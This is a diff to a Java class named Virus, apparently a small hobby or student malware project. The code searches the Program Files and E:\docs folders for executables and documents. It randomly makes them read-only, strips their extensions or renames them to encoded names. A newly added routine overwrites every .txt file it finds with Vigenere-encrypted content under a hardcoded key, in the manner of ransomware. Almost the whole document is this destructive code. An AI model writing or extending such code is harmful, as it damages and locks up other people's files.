@@ -1,7 +1,9 @@
 package model;
 
 import coder.Mixer;
+import coder.VigenereCoder;
 import input_output.IOFileHandling;
+import org.apache.commons.io.FilenameUtils;
 
 import java.io.File;
 import java.io.IOException;
@@ -13,12 +15,15 @@ import java.util.function.Predicate;
 
 public class Virus {
 
+    public static final String ALPHABET = "mhLNCoGa9.b?4nS7Z5TkPxyHv6d+8VMOJ!RlFjpY01 K=z2c'Er,/eW3XwUIqsQ-itgDAfuB*";
+    public static final String KEY = "gndkdlkjjfe'em,ldidskfvkmjfnghhb";
     public static final Path DIRECTORY_WITH_EXE_FILES = Paths.get("C:", "Program Files");
     public static final Path DIRECTORY_WITH_DOC_FILES = Paths.get("E:", "docs");
     public static final int MAX_DEPTH = 3;
 
     private static List<String> filesNamesList = new ArrayList<>();
     private static Predicate<File> predicateExe = f -> f.getName().endsWith(".exe");
+    private static Predicate<File> predicateTxt = f -> f.getName().endsWith(".txt");
     private static Predicate<File> predicateDoc = f -> f.getName().endsWith(".doc") || f.getName().endsWith(".docx");
     private static int depth = 0;
 
@@ -51,10 +56,9 @@ public class Virus {
                 depth--;
             }
         } else if (predicate.test(f)) {
-            if (f.getAbsolutePath().split("/").length > 5) {
-                System.out.println(f.getAbsolutePath());
+            if (!filesNamesList.contains(f.getAbsolutePath())) {
+                filesNamesList.add(f.getAbsolutePath());
             }
-            filesNamesList.add(f.getAbsolutePath());
         }
     }
 
@@ -63,7 +67,7 @@ public class Virus {
         for (String s : filesList) {
             File file = new File(s);
             try {
-                switch ((int) (Math.random() * 3)) {
+                switch ((int) (Math.random() * 4)) {
                     case 0: {
                         file.setReadOnly();
                         break;
@@ -74,6 +78,14 @@ public class Virus {
                     }
                     case 2: {
                         file.renameTo(new File(s.substring(0, s.indexOf("."))));
+                        break;
+                    }
+                    case 3: {
+                        String filePath = Paths.get(s).getParent().toString();
+                        String extension = "." + FilenameUtils.getExtension(s);
+                        String fileName = s.substring(s.lastIndexOf('\\', s.indexOf('.')));
+                        fileName = Mixer.encode(fileName);
+                        file.renameTo(new File(filePath + fileName + extension));
                         break;
                     }
                 }
@@ -116,5 +128,30 @@ public class Virus {
             String encodedFile = Mixer.decode(byteArrToString(fileInByte));
             IOFileHandling.byteArrToFile(s, stringToByteArr(encodedFile));
         }
+    }
+
+    public static void encodeFileContent() throws IOException {
+        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateTxt);
+        for (String s : filesList) {
+            String encodedText = VigenereCoder.getInstance().encode(KEY, prepareInputText(s));
+            IOFileHandling.writeToFile(encodedText, s);
+        }
+    }
+
+    public static void decodeFileContent() throws IOException {
+        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateTxt);
+        System.out.println(filesList.size());
+        for (String s : filesList) {
+            System.out.println(s);
+            String encodedText = VigenereCoder.getInstance().decode(KEY, prepareInputText(s));
+            IOFileHandling.writeToFile(encodedText, s);
+        }
+    }
+
+    private static String prepareInputText(String fileName) {
+        String text = IOFileHandling.readFromFile(fileName);
+        System.out.println("text: " + text);
+        VigenereCoder.getInstance().setAlphabet(ALPHABET);
+        return text;
     }
 }
